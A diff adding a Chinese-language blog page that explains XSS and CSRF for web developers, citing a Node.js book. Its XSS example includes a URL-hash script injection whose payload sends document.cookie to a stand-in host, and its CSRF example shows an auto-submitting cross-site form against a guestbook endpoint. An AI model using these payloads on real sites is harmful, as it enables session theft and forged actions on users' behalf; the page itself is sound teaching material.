@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>web安全之攻击 | Kinthon</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="以下知识主要来自《深入浅出Node.js》一书
+
+XSS攻击
+概念
+其全称是跨站脚本攻击（Cross Site Scripting）
+通常是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS攻击是利用了XSS漏洞，让别的脚本执行，它的主要形成原因多数是因为 用户的输入没有被转义，而被直接执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全之攻击">
+<meta property="og:url" content="https://sysukinthon.github.io/2016/08/02/Web-Security-attack-md/index.html">
+<meta property="og:site_name" content="Kinthon">
+<meta property="og:description" content="以下知识主要来自《深入浅出Node.js》一书
+
+XSS攻击
+概念
+其全称是跨站脚本攻击（Cross Site Scripting）
+通常是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS攻击是利用了XSS漏洞，让别的脚本执行，它的主要形成原因多数是因为 用户的输入没有被转义，而被直接执行">
+<meta property="og:updated_time" content="2016-11-06T12:23:35.181Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web安全之攻击">
+<meta name="twitter:description" content="以下知识主要来自《深入浅出Node.js》一书
+
+XSS攻击
+概念
+其全称是跨站脚本攻击（Cross Site Scripting）
+通常是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS攻击是利用了XSS漏洞，让别的脚本执行，它的主要形成原因多数是因为 用户的输入没有被转义，而被直接执行">
+  
+    <link rel="alternative" href="/atom.xml" title="Kinthon" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+<link rel="canonical" href="https://sysukinthon.github.io/2016/08/02/Web-Security-attack-md/">
+<script type="text/javascript">
+       var host = "sysukinthon.github.io";
+       if ((host == window.location.host) && (window.location.protocol != "https:"))
+           window.location.protocol = "https";
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Kinthon</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						
+						<li>关于我</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/tags/Web">前端</a></li>
+				        
+							<li><a href="/tags/CG">计算机图形学</a></li>
+				        
+							<li><a href="/tags/ML">机器学习</a></li>
+				        
+							<li><a href="/tags/NN">神经网络</a></li>
+				        
+							<li><a href="/tags/Others">其他</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/sysuKinthon" title="github">github</a>
+					        
+								<a class="douban" target="_blank" href="http://www.cnblogs.com/kinthon/" title="douban">douban</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Browser/" style="font-size: 10px;">Browser</a> <a href="/tags/CG/" style="font-size: 13.33px;">CG</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/DL/" style="font-size: 11.67px;">DL</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JS/" style="font-size: 10px;">JS</a> <a href="/tags/ML/" style="font-size: 16.67px;">ML</a> <a href="/tags/Math/" style="font-size: 10px;">Math</a> <a href="/tags/NN/" style="font-size: 10px;">NN</a> <a href="/tags/Node/" style="font-size: 15px;">Node</a> <a href="/tags/OpenGL/" style="font-size: 11.67px;">OpenGL</a> <a href="/tags/OpengGL/" style="font-size: 10px;">OpengGL</a> <a href="/tags/Opengl/" style="font-size: 10px;">Opengl</a> <a href="/tags/Others/" style="font-size: 18.33px;">Others</a> <a href="/tags/Project/" style="font-size: 13.33px;">Project</a> <a href="/tags/Security/" style="font-size: 10px;">Security</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/基础知识/" style="font-size: 11.67px;">基础知识</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">灵魂之于菩堤，清则静； 追求之于世俗，强则存。</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Kinthon</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Kinthon</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/tags/Web">前端</a></li>
+		        
+					<li><a href="/tags/CG">计算机图形学</a></li>
+		        
+					<li><a href="/tags/ML">机器学习</a></li>
+		        
+					<li><a href="/tags/NN">神经网络</a></li>
+		        
+					<li><a href="/tags/Others">其他</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/sysuKinthon" title="github">github</a>
+			        
+						<a class="douban" target="_blank" href="http://www.cnblogs.com/kinthon/" title="douban">douban</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-Web-Security-attack-md" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/08/02/Web-Security-attack-md/" class="article-date">
+  	<time datetime="2016-08-02T09:09:15.000Z" itemprop="datePublished">2016-08-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web安全之攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+	</div>
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>以下知识主要来自<code>《深入浅出Node.js》</code>一书</p>
+</blockquote>
+<h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><ul>
+<li>概念<ul>
+<li>其全称是跨站脚本攻击（Cross Site Scripting）</li>
+<li>通常是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS攻击是利用了XSS漏洞，让别的脚本执行，它的主要形成原因多数是因为 用户的输入没有被转义，而被直接执行<a id="more"></a></li>
+</ul>
+</li>
+<li>例子<ul>
+<li>有个网站的前端脚本如下<code>$(#box).html(location.hash.replace(&#39;#&#39;, &#39;&#39;))</code>,它会将URL hash中的值设置到页面中，以实现某种逻辑；这里攻击者可以构造如下的URL<code>http://a.com/pathname#&lt;script src=&quot;http://b.com/c.js&quot;&gt;&lt;/script&gt;</code>然后将这个网站发给某个已经登录了<code>http://a.com/pathname</code>的用户，此时会发生的情况是，a.com网站加载完成后，运行了<code>$(#box).html(location.hash.replace(&#39;#&#39;,&#39;&#39;))</code>的逻辑，<code>&lt;script src=&quot;http://b.com/c.js&quot;&gt;</code>被解析，加载，运行；这里我们假设c.js这个文件的内容<code>location.href = &quot;http://c.com/?&quot; + document.cookie;</code>这样就会发生，用户的cookie被发送了<code>http://c.com</code>这个网站了,从而得到了用户cookie</li>
+</ul>
+</li>
+</ul>
+<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><ul>
+<li>概念<ul>
+<li>其全称是跨站请求伪造(Cross-Site Request Forgery)</li>
+<li>服务端与客户端通过Cookie来标识和认证用户，通常而言，用户通过浏览器访问服务端的Session ID是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招</li>
+</ul>
+</li>
+<li><p>例子</p>
+<ul>
+<li><p>某个网站有这样一个留言程序，提交留言的接口为<code>http://domain_a.com/guestbook</code>用户通过POST提交content字段就能成功留言，服务端会自动从Session数据中判断是谁提交的数据，补足username和updateAt两个字段后向数据库中定入数据，如下所示</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = req.body.content || <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">var</span> username = req.session.username;</span><br><span class="line">  <span class="keyword">var</span> feedback = &#123;</span><br><span class="line">  username: username,</span><br><span class="line">  content: content,</span><br><span class="line">  updatedAt: <span class="built_in">Date</span>.now()</span><br><span class="line">  &#125;;</span><br><span class="line">  db.save(feedback, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>);</span><br><span class="line">  res.end(<span class="string">'Ok'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>正常情况下，谁提交的留言，就会在列表中显示谁的信息，如果某个攻击者发现了这里的接口存在CSRF漏洞，那么他就可以在另一个网站(<a href="http://domain_b.com/attack)上构造了一个表单提交，如下所示" target="_blank" rel="external">http://domain_b.com/attack)上构造了一个表单提交，如下所示</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"test"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">action</span>=<span class="value">"http://domain_a.com/guestbook"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"content"</span> <span class="attribute">value</span>=<span class="value">"vim是</span><br><span class="line">上的编辑器"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">  $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#test"</span>).submit();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这种情况下，攻击者只要引诱某个<strong>domain_a的登录用户</strong>访问这个domain_b的网站，就会自己提交一个留言，由于在提交到domain_a的过程中（访问domain_a了，浏览器会自己携带上cookie的），浏览器会将domain_a的Cookie发送到服务器，尽管这个请求就是来自domain_b的，但是服务器并不知情，用户了不知情。</p>
+</li>
+<li>关于csrf防御的可以参考 <a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/" target="_blank" rel="external">链接</a>,使用Referer,token,自定义http字段都是相关的解决方案</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/08/08/Web-Node-input-file/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          node 上传文件实现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/07/31/Web-CSS-problem-collection-md/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">前端CSS种种问题收集</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Web-Security-attack-md" data-title="web安全之攻击" data-url="https://sysukinthon.github.io/2016/08/02/Web-Security-attack-md/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Kinthon
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
